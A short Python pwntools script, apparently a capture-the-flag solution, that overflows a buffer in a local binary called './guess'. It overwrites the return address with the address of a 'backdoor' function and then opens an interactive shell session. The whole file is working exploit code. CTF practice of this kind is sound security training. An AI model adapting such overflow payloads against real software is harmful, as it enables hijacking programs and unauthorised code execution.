from pwn import *
context.log_level = "debug"
sh = process("./guess")
backdoor = 0x804863B
def pwn():
    payload = b'a'*39+p32(0xdeadbeef)+p32(backdoor)
    payload = payload.ljust(0x40,b'a')
    # gdb.attach(sh)
    # pause()
    sh.sendafter(b"Please type a hexadecimal number!\n",payload)
    sh.interactive()
if __name__ == "__main__":
    pwn()